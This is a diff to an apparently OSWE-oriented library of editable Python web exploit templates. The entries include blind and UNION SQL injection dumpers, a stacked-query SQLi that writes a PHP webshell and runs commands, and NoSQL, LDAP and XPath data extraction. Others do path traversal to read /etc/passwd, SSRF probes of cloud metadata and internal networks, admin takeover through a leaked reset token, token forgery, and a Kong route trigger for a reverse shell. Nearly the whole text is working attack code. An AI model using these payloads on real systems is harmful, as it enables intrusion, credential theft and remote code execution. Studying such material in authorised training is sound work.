+        # Basic auth example: "Authorization": "Basic BASE64_USER_COLON_PASS"
+        # Bearer/API example: "Authorization": "Bearer REPLACE"
+        # "X-API-Key": "REPLACE",
+    }
+    COOKIES = {                            # EDIT static cookies
+        # "JSESSIONID": "REPLACE",
+    }
+    COOKIE_HEADER = ""                     # EDIT optional Burp Cookie header; merged into COOKIES
 
-    check(AUTH_MODE in ("basic", "cookie", "header", "none"), "bad AUTH_MODE")
-    if AUTH_MODE == "basic":
-        s.auth = (USERNAME, PASSWORD)
-        print("[+] using HTTP Basic auth for future requests")
-    elif AUTH_MODE == "cookie":
+    if COOKIE_HEADER:
         check("=" in COOKIE_HEADER, "COOKIE_HEADER must look like 'name=value; other=value'")
         for item in COOKIE_HEADER.split(";"):
             if "=" in item:
                 k, v = item.strip().split("=", 1)
-                s.cookies.set(k, v)
-        print("[+] loaded cookies:", s.cookies.get_dict())
-    elif AUTH_MODE == "header":
-        s.headers.update({HEADER_NAME: HEADER_VALUE})
-        print("[+] set header:", HEADER_NAME)
-    else:
-        print("[*] no auth configured")
+                COOKIES[k] = v
+    check(HEADERS or COOKIES, "set HEADERS or COOKIES first")
+    if HEADERS:
+        print("[+] explicit headers ready:", ", ".join(HEADERS.keys()))
+    if COOKIES and SESSION_COOKIES:
+        s.cookies.update(COOKIES)
+        print("[+] installed cookies:", s.cookies.get_dict())
 
     if CHECK_PATH:
-        r = s.get(url(CHECK_PATH), timeout=TIMEOUT)
+        r = send_request("GET", CHECK_PATH, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
         dprint("auth check:", r.status_code, r.url, s.cookies.get_dict())
         check(r.status_code != 401, "auth check returned 401")
         if SUCCESS_TEXT:
             check(SUCCESS_TEXT in r.text, "auth marker not found")
-    return True
+    return {"headers": HEADERS, "cookies": COOKIES}
 `
   },
   {
@@ -1106,7 +1130,7 @@ def callback_url(path="", scheme="http"):
     defaultFunction:"forge_node_aes_json_token",
     aliases:["aes token","guacamole","guaclite","iv value","base64 json token","node crypto","decrypt token","forge token","clientOptions"],
     useWhen:"Source shows a token shaped like base64(JSON({iv,value})) encrypted with Node crypto AES-CBC and the key is recoverable from config/source.",
-    editFirst:["TOKEN","GET_TOKEN_PATH","KEY","CIPHER","MODIFICATIONS_JSON"],
+    editFirst:["TOKEN","GET_TOKEN_PATH","HEADERS","COOKIES","SESSION_COOKIES","KEY","CIPHER","MODIFICATIONS_JSON"],
     dependsOn:[],
     sourceRefs:["Jose_Abreu OSWE 10-Challenge codex.py","Jose_Abreu OSWE 10-Challenge claude.py"],
     code:String.raw`def forge_node_aes_json_token():
@@ -1116,6 +1140,9 @@ def callback_url(path="", scheme="http"):
     GET_TOKEN_PATH = "/token"           # EDIT endpoint that returns token if TOKEN empty
     GET_TOKEN_JSON = {}                 # EDIT JSON body for token creation
     TOKEN_JSON_KEY = "token"            # EDIT token field name, or "" for raw body
+    HEADERS = {}                        # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                        # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True              # EDIT True keeps s cookies from login; False = only COOKIES above
     KEY = ""                            # EDIT raw key from source/config
     KEY_ENCODING = "utf8"               # EDIT: utf8/hex/base64
     CIPHER = "aes-256-cbc"              # EDIT Node cipher name
@@ -1167,7 +1194,7 @@ if (input.operation === "decrypt") {
 
     token = TOKEN
     if not token:
-        r = s.post(url(GET_TOKEN_PATH), json=GET_TOKEN_JSON, timeout=TIMEOUT)
+        r = send_request("POST", GET_TOKEN_PATH, json_body=GET_TOKEN_JSON, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
         check(r.status_code < 500, "token request failed")
         if TOKEN_JSON_KEY:
             token = r.json()[TOKEN_JSON_KEY]
@@ -1192,7 +1219,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"reset_token_takeover",
     aliases:["reset password","token leak","admin takeover","predict token"],
     useWhen:"You can leak, predict, or read a reset token and then set admin credentials.",
-    editFirst:["REQUEST_RESET_PATH","TOKEN_SOURCE_PATH","RESET_PATH","ADMIN_USER"],
+    editFirst:["REQUEST_RESET_PATH","TOKEN_SOURCE_PATH","RESET_PATH","HEADERS","COOKIES","SESSION_COOKIES","ADMIN_USER"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def reset_token_takeover():
@@ -1201,14 +1228,17 @@ if (input.operation === "decrypt") {
     RESET_PATH = "/reset"                # EDIT
     ADMIN_USER = "admin"                 # EDIT
     NEW_PASS = "Password123!"            # EDIT
+    HEADERS = {}                         # EDIT e.g. {"Authorization": "Basic BASE64_USER_COLON_PASS"}
+    COOKIES = {}                         # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True               # EDIT True keeps s cookies from login; False = only COOKIES above
 
-    s.post(url(REQUEST_RESET_PATH), data={"user": ADMIN_USER}, timeout=TIMEOUT)
-    r = s.get(url(TOKEN_SOURCE_PATH), timeout=TIMEOUT)
+    send_request("POST", REQUEST_RESET_PATH, data={"user": ADMIN_USER}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
+    r = send_request("GET", TOKEN_SOURCE_PATH, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     m = re.search(r"token=([A-Za-z0-9._-]+)", r.text)  # EDIT regex
     check(m, "reset token not found")
 
     data = {"token": m.group(1), "password": NEW_PASS, "confirm": NEW_PASS}
-    r = s.post(url(RESET_PATH), data=data, timeout=TIMEOUT)
+    r = send_request("POST", RESET_PATH, data=data, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code in (200, 302), "password reset failed")
     print("[+] admin password reset")
     return NEW_PASS
@@ -1223,7 +1253,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"dump_boolean_oracle",
     aliases:["sqli","boolean","blind","dump","oracle","bisection","bitwise","sql anding","mssql"],
     useWhen:"A request changes page text/status when a SQL condition is true vs false. Supports charset, binary-search, and bitwise character extraction.",
-    editFirst:["INJECT_PATH","TRUE_MARKER","QUERY","MAX_LEN","STRATEGY","CHAR_EXPR","LEN_CONDITION"],
+    editFirst:["INJECT_PATH","HEADERS","COOKIES","SESSION_COOKIES","TRUE_MARKER","QUERY","MAX_LEN","STRATEGY","CHAR_EXPR","LEN_CONDITION"],
     dependsOn:[],
     sourceRefs:["v4","Skeleton Scripts"],
     code:String.raw`def dump_boolean_oracle():
@@ -1237,10 +1267,13 @@ if (input.operation === "decrypt") {
     ASCII_MAX = 126                                    # EDIT
     LEN_CONDITION = "length(({query}))>={pos}"          # EDIT DB syntax: LEN(CAST(({query}) AS NVARCHAR(MAX)))>={pos}
     CHAR_EXPR = "ascii(substr(({query}),{pos},1))"      # EDIT DB syntax: ASCII(SUBSTRING(CAST(({query}) AS NVARCHAR(MAX)),{pos},1))
+    HEADERS = {}                                       # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                                       # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                             # EDIT True keeps s cookies from login; False = only COOKIES above
 
     def oracle(condition):
         payload = f"' OR ({condition})-- -"            # EDIT syntax
-        r = s.get(url(INJECT_PATH + quote(payload)), timeout=TIMEOUT)
+        r = send_request("GET", INJECT_PATH + quote(payload), headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
         return TRUE_MARKER in r.text
 
     out = ""
@@ -1287,7 +1320,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"dump_time_oracle",
     aliases:["sqli","time","blind","sleep","waitfor","benchmark","pg sleep","mysql sleep"],
     useWhen:"No visible output changes, but true conditions create a measurable delay.",
-    editFirst:["INJECT_PATH","SLEEP_SECONDS","QUERY","THRESHOLD"],
+    editFirst:["INJECT_PATH","HEADERS","COOKIES","SESSION_COOKIES","SLEEP_SECONDS","QUERY","THRESHOLD"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def dump_time_oracle():
@@ -1296,11 +1329,14 @@ if (input.operation === "decrypt") {
     THRESHOLD = 2.0                  # EDIT after baseline
     QUERY = "select database()"      # EDIT
     CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_-.@{}"  # EDIT
+    HEADERS = {}                     # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                     # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True           # EDIT True keeps s cookies from login; False = only COOKIES above
 
     def oracle(condition):
         payload = f"1 AND IF(({condition}),SLEEP({SLEEP_SECONDS}),0)"  # EDIT DB syntax
         start = time.time()
-        s.get(url(INJECT_PATH + quote(payload)), timeout=TIMEOUT + SLEEP_SECONDS)
+        send_request("GET", INJECT_PATH + quote(payload), headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES, timeout=TIMEOUT + SLEEP_SECONDS)
         return (time.time() - start) > THRESHOLD
 
     out = ""
@@ -1325,7 +1361,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"dump_sqli_union",
     aliases:["sqli","union","visible output","marker","concat","group_concat"],
     useWhen:"SQLi output is reflected in the page and UNION SELECT can print a marker.",
-    editFirst:["INJECT_PATH","COLUMN_COUNT","VISIBLE_COL","QUERY","MARKER"],
+    editFirst:["INJECT_PATH","HEADERS","COOKIES","SESSION_COOKIES","COLUMN_COUNT","VISIBLE_COL","QUERY","MARKER"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def dump_sqli_union():
@@ -1334,11 +1370,14 @@ if (input.operation === "decrypt") {
     VISIBLE_COL = 2                           # EDIT 1-based column index
     QUERY = "select database()"               # EDIT
     MARKER = "OSWE"                           # EDIT
+    HEADERS = {}                              # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                              # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                    # EDIT True keeps s cookies from login; False = only COOKIES above
 
     cols = ["NULL"] * COLUMN_COUNT
     cols[VISIBLE_COL - 1] = f"concat('{MARKER}',({QUERY}),'{MARKER}')"
     payload = "-1 UNION SELECT " + ",".join(cols) + "-- -"  # EDIT comment style
-    r = s.get(url(INJECT_PATH + quote(payload)), timeout=TIMEOUT)
+    r = send_request("GET", INJECT_PATH + quote(payload), headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     m = re.search(MARKER + r"(.*?)" + MARKER, r.text, re.S)
     check(m, "union marker not reflected")
     print("[dump]", m.group(1))
@@ -1354,7 +1393,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"sqli_stacked_webshell",
     aliases:["sqli","stacked","outfile","into dumpfile","xp_cmdshell","rce","webshell"],
     useWhen:"Stacked queries or DB file-write/exec is confirmed and you need to establish RCE.",
-    editFirst:["INJECT_PATH","WEBROOT_PATH","SHELL_URL","STACKED_PAYLOAD"],
+    editFirst:["INJECT_PATH","HEADERS","COOKIES","SESSION_COOKIES","WEBROOT_PATH","SHELL_URL","STACKED_PAYLOAD"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def sqli_stacked_webshell():
@@ -1363,10 +1402,13 @@ if (input.operation === "decrypt") {
     SHELL_URL = "/shell.php"                          # EDIT
     SHELL = "<?php system($_GET['cmd']); ?>"          # EDIT
     STACKED_PAYLOAD = f"1; SELECT '{SHELL}' INTO OUTFILE '{WEBROOT_PATH}';-- -"  # EDIT DB syntax
+    HEADERS = {}                                      # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                                      # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                            # EDIT True keeps s cookies from login; False = only COOKIES above
 
-    r = s.get(url(INJECT_PATH + quote(STACKED_PAYLOAD)), timeout=TIMEOUT)
+    r = send_request("GET", INJECT_PATH + quote(STACKED_PAYLOAD), headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code < 500, "stacked payload caused server error")
-    r = s.get(url(SHELL_URL), params={"cmd": "whoami"}, timeout=TIMEOUT)
+    r = send_request("GET", SHELL_URL, params={"cmd": "whoami"}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code == 200, "webshell not reachable after SQLi")
     print("[+] SQLi RCE/webshell ready")
     return SHELL_URL
@@ -1381,7 +1423,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"dump_nosql_regex",
     aliases:["nosql","mongo","regex","operator injection","password dump"],
     useWhen:"JSON or form parameters accept Mongo-style operators and regex prefix checks change the response.",
-    editFirst:["LOGIN_PATH","FIELD","TRUE_MARKER","CHARSET","MAX_LEN"],
+    editFirst:["LOGIN_PATH","HEADERS","COOKIES","SESSION_COOKIES","FIELD","TRUE_MARKER","CHARSET","MAX_LEN"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def dump_nosql_regex():
@@ -1390,13 +1432,16 @@ if (input.operation === "decrypt") {
     TRUE_MARKER = "Dashboard"    # EDIT
     CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.@{}"  # EDIT
     MAX_LEN = 80                 # EDIT
+    HEADERS = {}                 # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                 # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True       # EDIT True keeps s cookies from login; False = only COOKIES above
 
     out = ""
     for _ in range(MAX_LEN):
         for ch in CHARSET:
             guess = "^" + re.escape(out + ch)
             body = {"username": "admin", FIELD: {"$regex": guess}}  # EDIT shape
-            r = s.post(url(LOGIN_PATH), json=body, timeout=TIMEOUT)
+            r = send_request("POST", LOGIN_PATH, json_body=body, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
             if TRUE_MARKER in r.text:
                 out += ch
                 print("[dump]", out)
@@ -1416,7 +1461,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"dump_ldap_prefix",
     aliases:["ldap","prefix","wildcard","filter injection","attribute dump"],
     useWhen:"LDAP filter injection supports wildcard prefix checks and true/false page signals.",
-    editFirst:["SEARCH_PATH","PARAM","ATTR","TRUE_MARKER","CHARSET"],
+    editFirst:["SEARCH_PATH","HEADERS","COOKIES","SESSION_COOKIES","PARAM","ATTR","TRUE_MARKER","CHARSET"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def dump_ldap_prefix():
@@ -1425,12 +1470,15 @@ if (input.operation === "decrypt") {
     ATTR = "mail"                # EDIT
     TRUE_MARKER = "result"       # EDIT
     CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_-.@"  # EDIT
+    HEADERS = {}                 # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                 # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True       # EDIT True keeps s cookies from login; False = only COOKIES above
 
     out = ""
     for _ in range(80):
         for ch in CHARSET:
             payload = f"*)({ATTR}={out + ch}*"  # EDIT filter shape
-            r = s.get(url(SEARCH_PATH), params={PARAM: payload}, timeout=TIMEOUT)
+            r = send_request("GET", SEARCH_PATH, params={PARAM: payload}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
             if TRUE_MARKER in r.text:
                 out += ch
                 print("[dump]", out)
@@ -1450,7 +1498,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"dump_xpath_boolean",
     aliases:["xpath","xml","boolean","substring","string-length"],
     useWhen:"XPath injection gives true/false response changes from substring or count checks.",
-    editFirst:["ENDPOINT","PARAM","TRUE_MARKER","XPATH_EXPR","CHARSET"],
+    editFirst:["ENDPOINT","HEADERS","COOKIES","SESSION_COOKIES","PARAM","TRUE_MARKER","XPATH_EXPR","CHARSET"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def dump_xpath_boolean():
@@ -1459,10 +1507,13 @@ if (input.operation === "decrypt") {
     TRUE_MARKER = "Welcome"      # EDIT
     XPATH_EXPR = "string(//user[1]/password)"  # EDIT
     CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_-.@{}"  # EDIT
+    HEADERS = {}                 # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                 # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True       # EDIT True keeps s cookies from login; False = only COOKIES above
 
     def oracle(condition):
         payload = f"' or {condition} or '"  # EDIT quote style
-        r = s.post(url(ENDPOINT), data={PARAM: payload, "password": "x"}, timeout=TIMEOUT)
+        r = send_request("POST", ENDPOINT, data={PARAM: payload, "password": "x"}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
         return TRUE_MARKER in r.text
 
     out = ""
@@ -1488,7 +1539,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"read_file_traversal",
     aliases:["lfi","path traversal","file read","download","etc passwd","web config","....//","dotdot split","traversal bypass"],
     useWhen:"A path/download parameter reads files outside the intended directory, including weak filters such as split('../').join('').",
-    editFirst:["READ_PATH","PARAM","FILE_PATH","PREFIX","BYPASS_MODE"],
+    editFirst:["READ_PATH","PARAM","FILE_PATH","HEADERS","COOKIES","SESSION_COOKIES","PREFIX","BYPASS_MODE"],
     dependsOn:[],
     sourceRefs:["v4","Jose_Abreu OSWE 10-Challenge claude.py"],
     code:String.raw`def read_file_traversal():
@@ -1497,6 +1548,9 @@ if (input.operation === "decrypt") {
     FILE_PATH = "/etc/passwd"         # EDIT
     PREFIX = "../../../../../../.."   # EDIT depth / encoding
     BYPASS_MODE = "plain"             # EDIT: plain/dotdot_split
+    HEADERS = {}                      # EDIT e.g. {"Authorization": "Basic BASE64_USER_COLON_PASS"}
+    COOKIES = {}                      # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True            # EDIT True keeps s cookies from login; False = only COOKIES above
 
     def encode_traversal(path):
         if BYPASS_MODE == "plain":
@@ -1507,7 +1561,7 @@ if (input.operation === "decrypt") {
         die("bad BYPASS_MODE")
 
     payload = encode_traversal(PREFIX + FILE_PATH)
-    r = s.get(url(READ_PATH), params={PARAM: payload}, timeout=TIMEOUT)
+    r = send_request("GET", READ_PATH, params={PARAM: payload}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     check(r.status_code == 200, f"file read failed: {r.status_code}")
     print(r.text[:2000])
     return r.text
@@ -1522,7 +1576,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"ssrf_oob_probe",
     aliases:["ssrf","oob","callback","metadata","burp collaborator","interactsh"],
     useWhen:"Server fetches a controlled URL and you need to prove callback or probe metadata.",
-    editFirst:["SSRF_PATH","URL_PARAM","METADATA_URL","--lhost","--lport"],
+    editFirst:["SSRF_PATH","URL_PARAM","METADATA_URL","HEADERS","COOKIES","SESSION_COOKIES","--lhost","--lport"],
     dependsOn:[],
     sourceRefs:["v4"],
     code:String.raw`def ssrf_oob_probe():
@@ -1530,9 +1584,12 @@ if (input.operation === "decrypt") {
     URL_PARAM = "url"                            # EDIT
     METADATA_URL = "http://169.254.169.254/"     # EDIT if allowed
     CALLBACK_URL = callback_url("cb")            # from --lhost/--lport
+    HEADERS = {}                                 # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                                 # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                       # EDIT True keeps s cookies from login; False = only COOKIES above
 
     for target in [CALLBACK_URL, METADATA_URL]:
-        r = s.post(url(SSRF_PATH), data={URL_PARAM: target}, timeout=TIMEOUT)
+        r = send_request("POST", SSRF_PATH, data={URL_PARAM: target}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
         print("[ssrf]", target, r.status_code, r.text[:200])
     return True
 `
@@ -1586,7 +1643,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"renderer_ssrf_port_scan",
     aliases:["ssrf port scan","pdf renderer","iframe","html to pdf","internal port scan","two requests"],
     useWhen:"A stored HTML field is rendered/fetched later by a PDF/bot/browser service, letting you scan internal ports.",
-    editFirst:["STORE_PATH","RENDER_PATH","FIELD","BASE_DATA","INTERNAL_HOST","PORTS"],
+    editFirst:["STORE_PATH","RENDER_PATH","HEADERS","COOKIES","SESSION_COOKIES","FIELD","BASE_DATA","INTERNAL_HOST","PORTS"],
     dependsOn:[],
     sourceRefs:["Skeleton Scripts"],
     code:String.raw`def renderer_ssrf_port_scan():
@@ -1597,12 +1654,15 @@ if (input.operation === "decrypt") {
     INTERNAL_HOST = "127.0.0.1"                  # EDIT seen by renderer, not by you
     PORTS = [80, 443, 8080, 8443, 3000, 5000, 8000, 8081]  # EDIT
     HTML_TEMPLATE = '<iframe src="http://{host}:{port}/" width="800" height="500"></iframe>'  # EDIT
+    HEADERS = {}                                 # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                                 # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                       # EDIT True keeps s cookies from login; False = only COOKIES above
 
     for port in PORTS:
         data = dict(BASE_DATA)
         data[FIELD] = HTML_TEMPLATE.format(host=INTERNAL_HOST, port=port)
-        s.get(url(STORE_PATH), params=data, timeout=TIMEOUT)
-        r = s.get(url(RENDER_PATH), timeout=TIMEOUT)
+        send_request("GET", STORE_PATH, params=data, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
+        r = send_request("GET", RENDER_PATH, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
         sample = r.text[:160].replace("\n", " ")
         print(f"[port {port}] status={r.status_code} len={len(r.content)} sample={sample}")
     return True
@@ -1617,7 +1677,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"ssrf_json_port_scan",
     aliases:["ssrf","json url","port scan","files import","econnrefused","permission error","internal port","module 10"],
     useWhen:"SSRF endpoint accepts JSON like {'url': 'http://host:port'} and response text/status reveals open, closed, forbidden, timeout, or parser states.",
-    editFirst:["SSRF_PATH","JSON_FIELD","INTERNAL_HOST","PORTS","OPEN_MARKERS","CLOSED_MARKERS"],
+    editFirst:["SSRF_PATH","JSON_FIELD","INTERNAL_HOST","HEADERS","COOKIES","SESSION_COOKIES","PORTS","OPEN_MARKERS","CLOSED_MARKERS"],
     dependsOn:[],
     sourceRefs:["OSWE module 10.4"],
     code:String.raw`def ssrf_json_port_scan():
@@ -1628,12 +1688,15 @@ if (input.operation === "decrypt") {
     OPEN_MARKERS = ["permission", "forbidden", "404", "not found", "socket hang up"]  # EDIT
     CLOSED_MARKERS = ["ECONNREFUSED", "connection refused"]    # EDIT
     VERBOSE = DEBUG
+    HEADERS = {}                                      # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                                      # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                            # EDIT True keeps s cookies from login; False = only COOKIES above
 
     hits = []
     for port in PORTS:
         target_url = f"{INTERNAL_HOST}:{int(port)}"
         try:
-            r = s.post(url(SSRF_PATH), json={JSON_FIELD: target_url}, timeout=TIMEOUT)
+            r = send_request("POST", SSRF_PATH, json_body={JSON_FIELD: target_url}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
             body = r.text
             low = body.lower()
             if VERBOSE:
@@ -1661,7 +1724,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"ssrf_path_param_scanner",
     aliases:["ssrf","path scanner","parameter scanner","api render","url parameter","files import","render bypass","module 9"],
     useWhen:"You found an SSRF JSON endpoint and need to discover valid paths and URL-like parameters on an internal service, e.g. /api/render?url=attacker.",
-    editFirst:["SSRF_PATH","JSON_FIELD","INTERNAL_BASE","CANDIDATES","OPEN_MARKERS"],
+    editFirst:["SSRF_PATH","JSON_FIELD","INTERNAL_BASE","HEADERS","COOKIES","SESSION_COOKIES","CANDIDATES","OPEN_MARKERS"],
     dependsOn:[],
     sourceRefs:["Notion 9.5"],
     code:String.raw`def ssrf_path_param_scanner():
@@ -1669,6 +1732,9 @@ if (input.operation === "decrypt") {
     JSON_FIELD = "url"                      # EDIT
     INTERNAL_BASE = "http://127.0.0.1:9000" # EDIT internal service base
     CALLBACK = callback_url("ssrf-test")    # EDIT value for url-like parameters
+    HEADERS = {}                            # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                            # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                  # EDIT True keeps s cookies from login; False = only COOKIES above
     CANDIDATES = [                          # EDIT paths and query shapes to probe
         "/",
         "/render",
@@ -1688,7 +1754,7 @@ if (input.operation === "decrypt") {
     for candidate in CANDIDATES:
         target_url = INTERNAL_BASE.rstrip("/") + "/" + candidate.lstrip("/")
         try:
-            r = s.post(url(SSRF_PATH), json={JSON_FIELD: target_url}, timeout=TIMEOUT)
+            r = send_request("POST", SSRF_PATH, json_body={JSON_FIELD: target_url}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
             body = r.text
             low = body.lower()
             if any(m.lower() in low for m in CLOSED_MARKERS):
@@ -1713,7 +1779,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"ssrf_internal_subnet_scan",
     aliases:["ssrf","subnet scan","host enumeration","172.16","internal discovery","docker network","microservices","module 10"],
     useWhen:"Need to find internal container/service hosts through SSRF. Supports /24 host enumeration and docker-style ranges.",
-    editFirst:["SSRF_PATH","JSON_FIELD","MODE","HOST_TEMPLATE","PORT","INTERESTING_MARKERS"],
+    editFirst:["SSRF_PATH","JSON_FIELD","HEADERS","COOKIES","SESSION_COOKIES","MODE","HOST_TEMPLATE","PORT","INTERESTING_MARKERS"],
     dependsOn:[],
     sourceRefs:["OSWE module 10.4"],
     code:String.raw`def ssrf_internal_subnet_scan():
@@ -1728,6 +1794,9 @@ if (input.operation === "decrypt") {
     FOURTH_RANGE = range(1, 255)      # EDIT class-c fourth octet
     PORT = 8000                       # EDIT likely internal service port
     INTERESTING_MARKERS = ["permission", "forbidden", "404", "not found", "unauthorized", "socket hang up"]  # EDIT
+    HEADERS = {}                      # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                      # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True            # EDIT True keeps s cookies from login; False = only COOKIES above
     hits = []
 
     if MODE == "class-c":
@@ -1739,7 +1808,7 @@ if (input.operation === "decrypt") {
         target_url = f"{host}:{int(PORT)}"
         print("\rTrying " + target_url.ljust(60), end="")
         try:
-            r = s.post(url(SSRF_PATH), json={JSON_FIELD: target_url}, timeout=TIMEOUT)
+            r = send_request("POST", SSRF_PATH, json_body={JSON_FIELD: target_url}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
             low = r.text.lower()
             if any(m.lower() in low for m in INTERESTING_MARKERS) or r.status_code not in (400, 401, 403, 404):
                 print("\r" + target_url.ljust(35) + f" status={r.status_code} body={r.text[:160]}")
@@ -1799,7 +1868,7 @@ if (input.operation === "decrypt") {
     defaultFunction:"deliver_url_to_render_service",
     aliases:["render service","url to pdf","puppeteer","api render","deliver html","apikey","module 10"],
     useWhen:"A URL-to-PDF/render service fetches your hosted HTML. Use it to trigger headless browser JS against internal services.",
-    editFirst:["DELIVERY_MODE","IMPORT_PATH","RENDER_PATH","PUBLIC_HTML_URL","API_KEY"],
+    editFirst:["DELIVERY_MODE","IMPORT_PATH","RENDER_PATH","HEADERS","COOKIES","SESSION_COOKIES","PUBLIC_HTML_URL","API_KEY"],
     dependsOn:[],
     sourceRefs:["OSWE module 10.6"],
     code:String.raw`def deliver_url_to_render_service():
@@ -1810,20 +1879,23 @@ if (input.operation === "decrypt") {
     URL_FIELD = "url"                   # EDIT
     PUBLIC_HTML_URL = callback_url("payload.html")  # EDIT hosted HTML URL
     API_KEY = ""                        # EDIT if direct render endpoint needs key
+    HEADERS = {}                        # EDIT e.g. {"Authorization": "Bearer REPLACE"}
+    COOKIES = {}                        # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True              # EDIT True keeps s cookies from login; False = only COOKIES above
 
     if DELIVERY_MODE == "ssrf-import":
         payload_url = RENDER_INTERNAL_URL + "?" + URL_FIELD + "=" + quote(PUBLIC_HTML_URL, safe="")
-        r = s.post(url(IMPORT_PATH), json={URL_FIELD: payload_url}, timeout=TIMEOUT)
+        r = send_request("POST", IMPORT_PATH, json_body={URL_FIELD: payload_url}, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     elif DELIVERY_MODE == "direct-render-get":
         params = {URL_FIELD: PUBLIC_HTML_URL}
         if API_KEY:
             params["apikey"] = API_KEY
-        r = s.get(url(RENDER_PATH), params=params, timeout=TIMEOUT)
+        r = send_request("GET", RENDER_PATH, params=params, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     else:
         body = {URL_FIELD: PUBLIC_HTML_URL}
         if API_KEY:
             body["apikey"] = API_KEY
-        r = s.post(url(RENDER_PATH), json=body, timeout=TIMEOUT)
+        r = send_request("POST", RENDER_PATH, json_body=body, headers=HEADERS, cookies=COOKIES, session_cookies=SESSION_COOKIES)
     print("[render]", r.status_code, r.text[:500])
     return r
 `
@@ -1888,13 +1960,16 @@ if (input.operation === "decrypt") {
     defaultFunction:"run_cmd",
     aliases:["kong trigger","pre-function trigger","route trigger","reverse shell","module 10"],
     useWhen:"Kong pre-function route/plugin is installed. Trigger the route to execute the plugin payload.",
-    editFirst:["ROUTE_PATH","METHOD"],
+    editFirst:["ROUTE_PATH","METHOD","HEADERS","COOKIES","SESSION_COOKIES"],
     dependsOn:[],
     sourceRefs:["OSWE module 10.7"],
     code:String.raw`def run_cmd(cmd=""):
     ROUTE_PATH = "/oswe-route"     # EDIT route created by Kong plugin payload
     METHOD = "GET"                 # EDIT
-    r = s.request(METHOD, url(ROUTE_PATH), timeout=TIMEOUT)
+    HEADERS = {}                   # EDIT e.g. {"Authorization": "Bearer REPLACE"}
